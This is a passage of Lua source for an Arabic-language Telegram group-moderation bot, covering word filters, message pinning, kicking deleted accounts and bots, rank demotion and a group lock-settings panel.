local list = redis:smembers(bot_id.."Tshakex:List:Filter"..msg.chat_id_)  
t = "\n• قائمة المنع \n━━━━━━━━\n"
for k,v in pairs(list) do  
local FilterMsg = redis:get(bot_id.."Tshakex:Filter:Reply2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..FilterMsg.."}\n"    
end  
if #list == 0 then  
t = "• لا يوجد كلمات ممنوعه"  
end  
send(msg.chat_id_, msg.id_,t)  
return false 
end
if text and text == "منع" and msg.reply_to_message_id_ == 0 and Admin(msg) then       
send(msg.chat_id_, msg.id_,"• ارسل الكلمه لمنعها")  
redis:set(bot_id.."Tshakex:Filter:Reply1"..msg.sender_user_id_..msg.chat_id_,"SetFilter")  
return false  
end
if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Admin(msg) then    
send(msg.chat_id_, msg.id_,"• ارسل الكلمه الان")  
redis:set(bot_id.."Tshakex:Filter:Reply1"..msg.sender_user_id_..msg.chat_id_,"DelFilter")  
return false 
end
if text ==("تثبيت") and msg.reply_to_message_id_ ~= 0 and Admin(msg) then
if redis:sismember(bot_id.."Tshakex:Lock:pin",msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_,msg.id_,"• التثبيت مقفل من قبل المنشئين")  
return false end
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100",""),message_id_ = msg.reply_to_message_id_,disable_notification_ = 1},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_,"• تم تثبيت الرساله بنجاح")   
redis:set(bot_id.."Tshakex:Get:Id:Msg:Pin"..msg.chat_id_,msg.reply_to_message_id_)
return false 
end
if data.code_ == 6 then
send(msg.chat_id_,msg.id_,"• البوت ليس ادمن هنا")  
return false 
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"• ليست لدي صلاحية التثبيت .")  
end;end,nil) 
return false 
end
if text == "الغاء التثبيت" and Admin(msg) then
if redis:sismember(bot_id.."Tshakex:Lock:pin",msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_,msg.id_,"• التثبيت مقفل من قبل المنشئين")  
return false end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_,"• تم الغاء تثبيت الرساله بنجاح")   
redis:del(bot_id.."Tshakex:Get:Id:Msg:Pin"..msg.chat_id_)
return false 
end
if data.code_ == 6 then
send(msg.chat_id_,msg.id_,"• البوت ليس ادمن هنا")  
return false 
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"• ليست لدي صلاحية التثبيت .")
end;end,nil)
return false 
end
if text == 'طرد المحذوفين' or text == 'مسح المحذوفين' then  
if Admin(msg) then    
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),offset_ = 0,limit_ = 1000}, function(arg,del)
for k, v in pairs(del.members_) do
tdcli_function({ID = "GetUser",user_id_ = v.user_id_},function(b,data) 
if data.first_name_ == false then
KickGroup(msg.chat_id_, data.id_)
end;end,nil);end
send(msg.chat_id_, msg.id_,'• تم طرد الحسابات المحذوفه')
end,nil)
end
return false 
end
if text ==("مسح المطرودين") and Admin(msg) then    
local function delbans(extra, result)  
if not msg.can_be_deleted_ == true then  
send(msg.chat_id_, msg.id_, "•  يرجى ترقيتي ادمن هنا") 
return false
end  
local num = 0 
for k,y in pairs(result.members_) do 
num = num + 1  
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = y.user_id_, status_ = { ID = "ChatMemberStatusLeft"}, }, dl_cb, nil)  
end  
send(msg.chat_id_, msg.id_,"•  تم الغاء الحظر عن *: "..num.." * شخص") 
end    
return false 
end
if text == "مسح البوتات" and Admin(msg) then 
tdcli_function ({ ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah)  
local admins = tah.members_  
local x = 0
local c = 0
for i=0 , #admins do 
if tah.members_[i].status_.ID == "ChatMemberStatusEditor" then  
x = x + 1 
end
if tonumber(admins[i].user_id_) ~= tonumber(bot_id) then
KickGroup(msg.chat_id_,admins[i].user_id_)
end
c = c + 1
end     
if (c - x) == 0 then
send(msg.chat_id_, msg.id_, "• لا توجد بوتات في المجموعه")
else
send(msg.chat_id_, msg.id_,"\n• عدد البوتات هنا : "..c.."\n• عدد البوتات التي هي ادمن : "..x.."\n• تم طرد - "..(c - x).." - بوتات ") 
end 
end,nil)  
return false 
end
if text == ("كشف البوتات") and Admin(msg) then  
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(extra,result,success)
local admins = result.members_  
text = "\n• قائمة البوتات \n━━━━━━━━\n"
local n = 0
local t = 0
for i=0 , #admins do 
n = (n + 1)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_
},function(arg,ta) 
if result.members_[i].status_.ID == "ChatMemberStatusMember" then  
tr = ""
elseif result.members_[i].status_.ID == "ChatMemberStatusEditor" then  
t = t + 1
tr = " {★}"
end
text = text..": [@"..ta.username_.."]"..tr.."\n"
if #admins == 0 then
send(msg.chat_id_, msg.id_, "• لا توجد بوتات في المجموعه")
return false 
end
if #admins == i then 
local a = "\n━━━━━━━━\n• عدد البوتات التي هنا : "..n.." بوت"
local f = "\n• عدد البوتات التي هي ادمن : "..t.."\n• ملاحضه علامة النجمه يعني البوت ادمن - ★ \n"
send(msg.chat_id_, msg.id_, text..a..f)
end
end,nil)
end
end,nil)
return false 
end

if text and text:match("^تنزيل الكل @(.*)$") and Owner(msg) then
function FunctionStatus(extra, result, success)
if (result.id_) then
if Dev_Bots_User(result.id_) == true then
send(msg.chat_id_, msg.id_,"•  لا تستطيع تنزيل المطور الاساسي")
return false 
end
if redis:sismember(bot_id.."Tshakex:Developer:Bot1",result.id_) then
dev = "مطور  🎖 ،" else dev = "" end
if redis:sismember(bot_id.."Tshakex:Developer:Bot",result.id_) then
dev = "مطور   ،" else dev = "" end
if redis:sismember(bot_id.."Tshakex:President:Group"..msg.chat_id_, result.id_) then
crr = "منشئ اساسي ،" else crr = "" end
if redis:sismember(bot_id..'Tshakex:Constructor:Group'..msg.chat_id_, result.id_) then
cr = "منشئ ،" else cr = "" end
if redis:sismember(bot_id..'Tshakex:Manager:Group'..msg.chat_id_, result.id_) then
own = "مدير ،" else own = "" end
if redis:sismember(bot_id..'Tshakex:Admin:Group'..msg.chat_id_, result.id_) then
mod = "ادمن ،" else mod = "" end
if redis:sismember(bot_id..'Tshakex:Vip:Group'..msg.chat_id_, result.id_) then
vip = "مميز ،" else vip = ""
end
if Rank_Checking(result.id_,msg.chat_id_) ~= false then
send(msg.chat_id_, msg.id_,"\n• تم تنزيل الشخص من الرتب التاليه \n•  { "..dev..""..crr..""..cr..""..own..""..mod..""..vip.." } \n")
else
send(msg.chat_id_, msg.id_,"\n• ليس لديه رتب حتى استطيع تنزيله \n")
end
if Dev_Bots_User(msg.sender_user_id_) == true then
redis:srem(bot_id.."Tshakex:Developer:Bot1", result.id_)
redis:srem(bot_id.."Tshakex:Developer:Bot", result.id_)
redis:srem(bot_id.."Tshakex:President:Group"..msg.chat_id_,result.id_)
redis:srem(bot_id..'Tshakex:Constructor:Group'..msg.chat_id_, result.id_)
redis:srem(bot_id..'Tshakex:Manager:Group'..msg.chat_id_, result.id_)
redis:srem(bot_id..'Tshakex:Admin:Group'..msg.chat_id_, result.id_)
redis:srem(bot_id..'Tshakex:Vip:Group'..msg.chat_id_, result.id_)
elseif redis:sismember(bot_id.."Tshakex:Developer:Bot1",msg.sender_user_id_) then
redis:srem(bot_id..'Tshakex:Admin:Group'..msg.chat_id_, result.id_)
redis:srem(bot_id..'Tshakex:Vip:Group'..msg.chat_id_, result.id_)
redis:srem(bot_id..'Tshakex:Manager:Group'..msg.chat_id_, result.id_)
redis:srem(bot_id..'Tshakex:Constructor:Group'..msg.chat_id_, result.id_)
redis:srem(bot_id.."Tshakex:President:Group"..msg.chat_id_,result.id_)
elseif redis:sismember(bot_id.."Tshakex:Developer:Bot",msg.sender_user_id_) then
redis:srem(bot_id..'Tshakex:Admin:Group'..msg.chat_id_, result.id_)
redis:srem(bot_id..'Tshakex:Vip:Group'..msg.chat_id_, result.id_)
redis:srem(bot_id..'Tshakex:Manager:Group'..msg.chat_id_, result.id_)
redis:srem(bot_id..'Tshakex:Constructor:Group'..msg.chat_id_, result.id_)
redis:srem(bot_id.."Tshakex:President:Group"..msg.chat_id_,result.id_)
elseif redis:sismember(bot_id.."Tshakex:President:Group"..msg.chat_id_, msg.sender_user_id_) then
redis:srem(bot_id..'Tshakex:Admin:Group'..msg.chat_id_, result.id_)
redis:srem(bot_id..'Tshakex:Vip:Group'..msg.chat_id_, result.id_)
redis:srem(bot_id..'Tshakex:Manager:Group'..msg.chat_id_, result.id_)
redis:srem(bot_id..'Tshakex:Constructor:Group'..msg.chat_id_, result.id_)
elseif redis:sismember(bot_id..'Tshakex:Constructor:Group'..msg.chat_id_, msg.sender_user_id_) then
redis:srem(bot_id..'Tshakex:Admin:Group'..msg.chat_id_, result.id_)
redis:srem(bot_id..'Tshakex:Vip:Group'..msg.chat_id_, result.id_)
redis:srem(bot_id..'Tshakex:Manager:Group'..msg.chat_id_, result.id_)
elseif redis:sismember(bot_id..'Tshakex:Manager:Group'..msg.chat_id_, msg.sender_user_id_) then
redis:srem(bot_id..'Tshakex:Admin:Group'..msg.chat_id_, result.id_)
redis:srem(bot_id..'Tshakex:Vip:Group'..msg.chat_id_, result.id_)
end
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^تنزيل الكل @(.*)$")}, FunctionStatus, nil)
end
if text == ("تنزيل الكل") and msg.reply_to_message_id_ ~= 0 and Owner(msg) then
function Function_Status(extra, result, success)
if Dev_Bots_User(result.sender_user_id_) == true then
send(msg.chat_id_, msg.id_,"•  لا تستطيع تنزيل المطور الاساسي")
return false 
end
if redis:sismember(bot_id.."Tshakex:Developer:Bot1",result.sender_user_id_) then
dev = "مطور  🎖 ،" else dev = "" end
if redis:sismember(bot_id.."Tshakex:Developer:Bot",result.sender_user_id_) then
dev = "مطور   ،" else dev = "" end
if redis:sismember(bot_id.."Tshakex:President:Group"..msg.chat_id_, result.sender_user_id_) then
crr = "منشئ اساسي ،" else crr = "" end
if redis:sismember(bot_id..'Tshakex:Constructor:Group'..msg.chat_id_, result.sender_user_id_) then
cr = "منشئ ،" else cr = "" end
if redis:sismember(bot_id..'Tshakex:Manager:Group'..msg.chat_id_, result.sender_user_id_) then
own = "مدير ،" else own = "" end
if redis:sismember(bot_id..'Tshakex:Admin:Group'..msg.chat_id_, result.sender_user_id_) then
mod = "ادمن ،" else mod = "" end
if redis:sismember(bot_id..'Tshakex:Vip:Group'..msg.chat_id_, result.sender_user_id_) then
vip = "مميز ،" else vip = ""
end
if Rank_Checking(result.sender_user_id_,msg.chat_id_) ~= false then
send(msg.chat_id_, msg.id_,"\n• تم تنزيل الشخص من الرتب التاليه \n•  { "..dev..""..crr..""..cr..""..own..""..mod..""..vip.." } \n")
else
send(msg.chat_id_, msg.id_,"\n• ليس لديه رتب حتى استطيع تنزيله \n")
end
if Dev_Bots_User(msg.sender_user_id_) == true then
redis:srem(bot_id.."Tshakex:Developer:Bot1", result.sender_user_id_)
redis:srem(bot_id.."Tshakex:Developer:Bot", result.sender_user_id_)
redis:srem(bot_id.."Tshakex:President:Group"..msg.chat_id_,result.sender_user_id_)
redis:srem(bot_id..'Tshakex:Constructor:Group'..msg.chat_id_, result.sender_user_id_)
redis:srem(bot_id..'Tshakex:Manager:Group'..msg.chat_id_, result.sender_user_id_)
redis:srem(bot_id..'Tshakex:Admin:Group'..msg.chat_id_, result.sender_user_id_)
redis:srem(bot_id..'Tshakex:Vip:Group'..msg.chat_id_, result.sender_user_id_)
elseif redis:sismember(bot_id.."Tshakex:Developer:Bot1",msg.sender_user_id_) then
redis:srem(bot_id..'Tshakex:Admin:Group'..msg.chat_id_, result.sender_user_id_)
redis:srem(bot_id..'Tshakex:Vip:Group'..msg.chat_id_, result.sender_user_id_)
redis:srem(bot_id..'Tshakex:Manager:Group'..msg.chat_id_, result.sender_user_id_)
redis:srem(bot_id..'Tshakex:Constructor:Group'..msg.chat_id_, result.sender_user_id_)
redis:srem(bot_id.."Tshakex:President:Group"..msg.chat_id_,result.sender_user_id_)
elseif redis:sismember(bot_id.."Tshakex:Developer:Bot",msg.sender_user_id_) then
redis:srem(bot_id..'Tshakex:Admin:Group'..msg.chat_id_, result.sender_user_id_)
redis:srem(bot_id..'Tshakex:Vip:Group'..msg.chat_id_, result.sender_user_id_)
redis:srem(bot_id..'Tshakex:Manager:Group'..msg.chat_id_, result.sender_user_id_)
redis:srem(bot_id..'Tshakex:Constructor:Group'..msg.chat_id_, result.sender_user_id_)
redis:srem(bot_id.."Tshakex:President:Group"..msg.chat_id_,result.sender_user_id_)
elseif redis:sismember(bot_id.."Tshakex:President:Group"..msg.chat_id_, msg.sender_user_id_) then
redis:srem(bot_id..'Tshakex:Admin:Group'..msg.chat_id_, result.sender_user_id_)
redis:srem(bot_id..'Tshakex:Vip:Group'..msg.chat_id_, result.sender_user_id_)
redis:srem(bot_id..'Tshakex:Manager:Group'..msg.chat_id_, result.sender_user_id_)
redis:srem(bot_id..'Tshakex:Constructor:Group'..msg.chat_id_, result.sender_user_id_)
elseif redis:sismember(bot_id..'Tshakex:Constructor:Group'..msg.chat_id_, msg.sender_user_id_) then
redis:srem(bot_id..'Tshakex:Admin:Group'..msg.chat_id_, result.sender_user_id_)
redis:srem(bot_id..'Tshakex:Vip:Group'..msg.chat_id_, result.sender_user_id_)
redis:srem(bot_id..'Tshakex:Manager:Group'..msg.chat_id_, result.sender_user_id_)
elseif redis:sismember(bot_id..'Tshakex:Manager:Group'..msg.chat_id_, msg.sender_user_id_) then
redis:srem(bot_id..'Tshakex:Admin:Group'..msg.chat_id_, result.sender_user_id_)
redis:srem(bot_id..'Tshakex:Vip:Group'..msg.chat_id_, result.sender_user_id_)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Status, nil)
return false end
if text == "رتبتي" then
local rtp = Get_Rank(msg.sender_user_id_,msg.chat_id_)
send(msg.chat_id_, msg.id_,"•  رتبتك في البوت ← "..rtp)
return false end
if text == "اسمي"  then 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(extra,result,success)
if result.first_name_  then
first_name = "•  اسمك الاول : `"..(result.first_name_).."`"
else
first_name = ""
end   
if result.last_name_ then 
last_name = "•  اسمك الثاني ← : `"..result.last_name_.."`" 
else
last_name = ""
end      
send(msg.chat_id_, msg.id_,first_name.."\n"..last_name) 
end,nil)
return false end
if text==("عدد المجموعه") and Admin(msg) then  
if msg.can_be_deleted_ == false then 
send(msg.chat_id_,msg.id_,"•  البوت ليس ادمن هنا \n") 
return false  
end 
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
local yazon = "•  عدد الادمنيه : "..data.administrator_count_..
"\n•  عدد المطرودين : "..data.kicked_count_..
"\n•  عدد الاعضاء : "..data.member_count_..
"\n•  عدد رسائل المجموعه : "..(msg.id_/2097152/0.5)..
"\n•  اسم المجموعه : ["..ta.title_.."]"
send(msg.chat_id_, msg.id_, yazon) 
end,nil)end,nil)
end
if text == "غادر" then 
if DeveloperBot(msg) and not redis:get(bot_id.."Tshakex:Lock:Left"..msg.chat_id_) then 
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
send(msg.chat_id_, msg.id_,"-") 
redis:srem(bot_id.."Tshakex:ChekBotAdd",msg.chat_id_)  
end
end
if text and text:match("^غادر (-%d+)$") then
local GP_ID = {string.match(text, "^(غادر) (-%d+)$")}
if DeveloperBot(msg) and not redis:get(bot_id.."Tshakex:Lock:Left"..msg.chat_id_) then 
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=GP_ID[2],user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
send(msg.chat_id_, msg.id_,"-") 
send(GP_ID[2], 0,"•  تم مغادرة المجموعه بامر من مطور  البوت") 
send(msg.chat_id_, msg.id_,"•  تم مغادرة المجموعه بامر من مطور  البوت") 
redis:srem(bot_id.."Tshakex:ChekBotAdd",GP_ID[2])  
end
end
if text == "الحمايه" and Admin(msg) then    
if redis:get(bot_id.."Tshakex:lockpin"..msg.chat_id_) then    
lock_pin = "✔️"
else 
lock_pin = "✖"    
end
if redis:get(bot_id.."Tshakex:Lock:tagservr"..msg.chat_id_) then    
lock_tagservr = "✔️"
else 
lock_tagservr = "✖"
end
if redis:get(bot_id.."Tshakex:Lock:text"..msg.chat_id_) then    
lock_text = "← ✔️"
else 
lock_text = "← ✖"    
end
if redis:get(bot_id.."Tshakex:Lock:AddMempar"..msg.chat_id_) == "kick" then
lock_add = "← ✔️"
else 
lock_add = "← ✖"    
end    
if redis:get(bot_id.."Tshakex:Lock:Join"..msg.chat_id_) == "kick" then
lock_join = "← ✔️"
else 
lock_join = "← ✖"    
end    
if redis:get(bot_id.."Tshakex:Lock:edit"..msg.chat_id_) then    
lock_edit = "← ✔️"
else 
lock_edit = "← ✖"    
end
if redis:get(bot_id.."Tshakex:Chek:Welcome"..msg.chat_id_) then
welcome = "← ✔️"
else 
welcome = "← ✖"    
end
if redis:hget(bot_id.."Tshakex:Spam:Group:User"..msg.chat_id_, "Spam:User") == "kick" then     
flood = "← بالطرد"     
elseif redis:hget(bot_id.."Tshakex:Spam:Group:User"..msg.chat_id_,"Spam:User") == "keed" then     
flood = "← بالتقييد "     
elseif redis:hget(bot_id.."Tshakex:Spam:Group:User"..msg.chat_id_,"Spam:User") == "mute" then     
flood = "← بالكتم"           
elseif redis:hget(bot_id.."Tshakex:Spam:Group:User"..msg.chat_id_,"Spam:User") == "del" then     
flood = "← ✔️"
else     
flood = "← ✖"     
end
if redis:get(bot_id.."Tshakex:Lock:Photo"..msg.chat_id_) == "del" then
lock_photo = "← ✔️" 
elseif redis:get(bot_id.."Tshakex:Lock:Photo"..msg.chat_id_) == "ked" then 
lock_photo = "← بالتقييد "   
elseif redis:get(bot_id.."Tshakex:Lock:Photo"..msg.chat_id_) == "ktm" then 
lock_photo = "← بالكتم"    
elseif redis:get(bot_id.."Tshakex:Lock:Photo"..msg.chat_id_) == "kick" then 
lock_photo = "← بالطرد"   
else
lock_photo = "← ✖"   
end    
if redis:get(bot_id.."Tshakex:Lock:Contact"..msg.chat_id_) == "del" then
lock_phon = "← ✔️" 
elseif redis:get(bot_id.."Tshakex:Lock:Contact"..msg.chat_id_) == "ked" then 
lock_phon = "← بالتقييد "    
elseif redis:get(bot_id.."Tshakex:Lock:Contact"..msg.chat_id_) == "ktm" then 
lock_phon = "← بالكتم"    
elseif redis:get(bot_id.."Tshakex:Lock:Contact"..msg.chat_id_) == "kick" then 
lock_phon = "← بالطرد"    
else
lock_phon = "← ✖"    
end    
if redis:get(bot_id.."Tshakex:Lock:Link"..msg.chat_id_) == "del" then
lock_links = "← ✔️"
elseif redis:get(bot_id.."Tshakex:Lock:Link"..msg.chat_id_) == "ked" then
lock_links = "← بالتقييد "    
elseif redis:get(bot_id.."Tshakex:Lock:Link"..msg.chat_id_) == "ktm" then
lock_links = "← بالكتم"    
elseif redis:get(bot_id.."Tshakex:Lock:Link"..msg.chat_id_) == "kick" then
lock_links = "← بالطرد"    
else
lock_links = "← ✖"    
end
if redis:get(bot_id.."Tshakex:Lock:Cmd"..msg.chat_id_) == "del" then
lock_cmds = "← ✔️"
elseif redis:get(bot_id.."Tshakex:Lock:Cmd"..msg.chat_id_) == "ked" then
lock_cmds = "← بالتقييد "    
elseif redis:get(bot_id.."Tshakex:Lock:Cmd"..msg.chat_id_) == "ktm" then
lock_cmds = "← بالكتم"   
elseif redis:get(bot_id.."Tshakex:Lock:Cmd"..msg.chat_id_) == "kick" then
lock_cmds = "← بالطرد"    
else
lock_cmds = "← ✖"    
end
if redis:get(bot_id.."Tshakex:Lock:User:Name"..msg.chat_id_) == "del" then
lock_user = "← ✔️"
elseif redis:get(bot_id.."Tshakex:Lock:User:Name"..msg.chat_id_) == "ked" then
lock_user = "← بالتقييد "    
elseif redis:get(bot_id.."Tshakex:Lock:User:Name"..msg.chat_id_) == "ktm" then
lock_user = "← بالكتم"    
elseif redis:get(bot_id.."Tshakex:Lock:User:Name"..msg.chat_id_) == "kick" then
lock_user = "← بالطرد"    
else
lock_user = "← ✖"    
end
if redis:get(bot_id.."Tshakex:Lock:hashtak"..msg.chat_id_) == "del" then
lock_hash = "← ✔️"
elseif redis:get(bot_id.."Tshakex:Lock:hashtak"..msg.chat_id_) == "ked" then 
lock_hash = "← بالتقييد "    
elseif redis:get(bot_id.."Tshakex:Lock:hashtak"..msg.chat_id_) == "ktm" then 
lock_hash = "← بالكتم"    
elseif redis:get(bot_id.."Tshakex:Lock:hashtak"..msg.chat_id_) == "kick" then 
lock_hash = "← بالطرد"    
else
lock_hash = "← ✖"    
end
if redis:get(bot_id.."Tshakex:Lock:vico"..msg.chat_id_) == "del" then
lock_muse = "← ✔️"
elseif redis:get(bot_id.."Tshakex:Lock:vico"..msg.chat_id_) == "ked" then 
lock_muse = "← بالتقييد "    
elseif redis:get(bot_id.."Tshakex:Lock:vico"..msg.chat_id_) == "ktm" then 
lock_muse = "← بالكتم"    
elseif redis:get(bot_id.."Tshakex:Lock:vico"..msg.chat_id_) == "kick" then 
lock_muse = "← بالطرد"    
else
lock_muse = "← ✖"    
end 
if redis:get(bot_id.."Tshakex:Lock:Video"..msg.chat_id_) == "del" then
lock_ved = "← ✔️"
elseif redis:get(bot_id.."Tshakex:Lock:Video"..msg.chat_id_) == "ked" then 
lock_ved = "← بالتقييد "    
elseif redis:get(bot_id.."Tshakex:Lock:Video"..msg.chat_id_) == "ktm" then 
lock_ved = "← بالكتم"    
elseif redis:get(bot_id.."Tshakex:Lock:Video"..msg.chat_id_) == "kick" then 
lock_ved = "← بالطرد"    
else
lock_ved = "← ✖"    
end
if redis:get(bot_id.."Tshakex:Lock:Animation"..msg.chat_id_) == "del" then
lock_gif = "← ✔️"
elseif redis:get(bot_id.."Tshakex:Lock:Animation"..msg.chat_id_) == "ked" then 
lock_gif = "← بالتقييد "    
elseif redis:get(bot_id.."Tshakex:Lock:Animation"..msg.chat_id_) == "ktm" then 
lock_gif = "← بالكتم"    
elseif redis:get(bot_id.."Tshakex:Lock:Animation"..msg.chat_id_) == "kick" then 
lock_gif = "← بالطرد"    
else
lock_gif = "← ✖"    
end
if redis:get(bot_id.."Tshakex:Lock:Sticker"..msg.chat_id_) == "del" then
lock_ste = "← ✔️"
elseif redis:get(bot_id.."Tshakex:Lock:Sticker"..msg.chat_id_) == "ked" then 
lock_ste = "بالتقييد "    
elseif redis:get(bot_id.."Tshakex:Lock:Sticker"..msg.chat_id_) == "ktm" then 
lock_ste = "بالكتم "    
elseif redis:get(bot_id.."Tshakex:Lock:Sticker"..msg.chat_id_) == "kick" then 
lock_ste = "← بالطرد"    
else
lock_ste = "← ✖"    
end
if redis:get(bot_id.."Tshakex:Lock:geam"..msg.chat_id_) == "del" then
lock_geam = "← ✔️"
elseif redis:get(bot_id.."Tshakex:Lock:geam"..msg.chat_id_) == "ked" then 
lock_geam = "← بالتقييد "    
elseif redis:get(bot_id.."Tshakex:Lock:geam"..msg.chat_id_) == "ktm" then 
lock_geam = "← بالكتم"    
elseif redis:get(bot_id.."Tshakex:Lock:geam"..msg.chat_id_) == "kick" then 
lock_geam = "← بالطرد"    
else
lock_geam = "← ✖"    
end    
if redis:get(bot_id.."Tshakex:Lock:vico"..msg.chat_id_) == "del" then
lock_vico = "← ✔️"
elseif redis:get(bot_id.."Tshakex:Lock:vico"..msg.chat_id_) == "ked" then 
lock_vico = "← بالتقييد "    
elseif redis:get(bot_id.."Tshakex:Lock:vico"..msg.chat_id_) == "ktm" then 
lock_vico = "← بالكتم"    
elseif redis:get(bot_id.."Tshakex:Lock:vico"..msg.chat_id_) == "kick" then 
lock_vico = "← بالطرد"    
else
lock_vico = "← ✖"    
end    
if redis:get(bot_id.."Tshakex:Lock:Keyboard"..msg.chat_id_) == "del" then
lock_inlin = "← ✔️"
elseif redis:get(bot_id.."Tshakex:Lock:Keyboard"..msg.chat_id_) == "ked" then 
lock_inlin = "← بالتقييد "
elseif redis:get(bot_id.."Tshakex:Lock:Keyboard"..msg.chat_id_) == "ktm" then 
lock_inlin = "← بالكتم"    
elseif redis:get(bot_id.."Tshakex:Lock:Keyboard"..msg.chat_id_) == "kick" then 
lock_inlin = "← بالطرد"
else
lock_inlin = "← ✖"
end
if redis:get(bot_id.."Tshakex:Lock:forward"..msg.chat_id_) == "del" then
lock_fwd = "← ✔️"
elseif redis:get(bot_id.."Tshakex:Lock:forward"..msg.chat_id_) == "ked" then 
lock_fwd = "← بالتقييد "    
elseif redis:get(bot_id.."Tshakex:Lock:forward"..msg.chat_id_) == "ktm" then 
lock_fwd = "← بالكتم"    
elseif redis:get(bot_id.."Tshakex:Lock:forward"..msg.chat_id_) == "kick" then 
lock_fwd = "← بالطرد"    
else
lock_fwd = "← ✖"    
end    
if redis:get(bot_id.."Tshakex:Lock:Document"..msg.chat_id_) == "del" then
lock_file = "← ✔️"
elseif redis:get(bot_id.."Tshakex:Lock:Document"..msg.chat_id_) == "ked" then 
lock_file = "← بالتقييد "    
elseif redis:get(bot_id.."Tshakex:Lock:Document"..msg.chat_id_) == "ktm" then 
lock_file = "← بالكتم"    
elseif redis:get(bot_id.."Tshakex:Lock:Document"..msg.chat_id_) == "kick" then 
lock_file = "← بالطرد"    
else
lock_file = "← ✖"    
end    
if redis:get(bot_id.."Tshakex:Lock:Unsupported"..msg.chat_id_) == "del" then
lock_self = "← ✔️"
elseif redis:get(bot_id.."Tshakex:Lock:Unsupported"..msg.chat_id_) == "ked" then 
lock_self = "← بالتقييد "    
elseif redis:get(bot_id.."Tshakex:Lock:Unsupported"..msg.chat_id_) == "ktm" then 
lock_self = "← بالكتم"    
elseif redis:get(bot_id.."Tshakex:Lock:Unsupported"..msg.chat_id_) == "kick" then 
lock_self = "← بالطرد"    
else
lock_self = "← ✖"    
end
if redis:get(bot_id.."Tshakex:Lock:Bot:kick"..msg.chat_id_) == "del" then
lock_bots = "← ✔️"
elseif redis:get(bot_id.."Tshakex:Lock:Bot:kick"..msg.chat_id_) == "ked" then
lock_bots = "← بالتقييد "   
elseif redis:get(bot_id.."Tshakex:Lock:Bot:kick"..msg.chat_id_) == "kick" then
lock_bots = "← بالطرد"    
else
lock_bots = "← ✖"    
end
if redis:get(bot_id.."Tshakex:Lock:Markdaun"..msg.chat_id_) == "del" then
lock_mark = "← ✔️"
elseif redis:get(bot_id.."Tshakex:Lock:Markdaun"..msg.chat_id_) == "ked" then 
lock_mark = "← بالتقييد "    
elseif redis:get(bot_id.."Tshakex:Lock:Markdaun"..msg.chat_id_) == "ktm" then 
lock_mark = "← بالكتم"    
elseif redis:get(bot_id.."Tshakex:Lock:Markdaun"..msg.chat_id_) == "kick" then 
lock_mark = "← بالطرد"    
else
lock_mark = "← ✖"    
end
if redis:get(bot_id.."Tshakex:Lock:Spam"..msg.chat_id_) == "del" then    
lock_spam = "← ✔️"
elseif redis:get(bot_id.."Tshakex:Lock:Spam"..msg.chat_id_) == "ked" then 
lock_spam = "← بالتقييد "    
elseif redis:get(bot_id.."Tshakex:Lock:Spam"..msg.chat_id_) == "ktm" then 
lock_spam = "← بالكتم"    
elseif redis:get(bot_id.."Tshakex:Lock:Spam"..msg.chat_id_) == "kick" then 
lock_spam = "← بالطرد"    
else
lock_spam = "← ✖"    
end        
if not redis:get(bot_id.."Tshakex:Reply:Manager"..msg.chat_id_) then
ReplyManager = "← ✔️"
else
ReplyManager = "← ✖"
end
if not redis:get(bot_id.."Tshakex:Reply:Sudo"..msg.chat_id_) then
ReplySudo = "← ✔️"
else
ReplySudo = "← ✖"
end
if not redis:get(bot_id.."Tshakex:Lock:Id:Photo"..msg.chat_id_)  then
IdPhoto = "← ✔️"
else
IdPhoto = "← ✖"
end
if not redis:get(bot_id.."Tshakex:Lock:Id:Py:Photo"..msg.chat_id_) then
IdPyPhoto = "← ✔️"
else
IdPyPhoto = "← ✖"
end
if not redis:get(bot_id.."Tshakex:Cheking:Kick:Me:Group"..msg.chat_id_)  then
KickMe = "← ✔️"
else
KickMe = "← ✖"
end
if not redis:get(bot_id.."Tshakex:Lock:Ban:Group"..msg.chat_id_)  then
Banusers = "← ✔️"
else
Banusers = "← ✖"
end
if not redis:get(bot_id.."Tshakex:Cheking:Seted"..msg.chat_id_) then
Setusers = "← ✔️"
else
Setusers = "← ✖"
end
if redis:get(bot_id.."Tshakex:Link_Group"..msg.chat_id_) then
Link_Group = "← ✔️"
else
Link_Group = "← ✖"
end
if not redis:get(bot_id.."Tshakex:Fun:Group"..msg.chat_id_) then
FunGroup = "← ✔️"
else
FunGroup = "← ✖"
end
local Num_Flood = redis:hget(bot_id.."Tshakex:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 0
send(msg.chat_id_, msg.id_,"*\n• اعدادات المجموعه "..
"\n━━━━━━━━"..
"\nعلامة ال (✔️) تعني مفعل"..
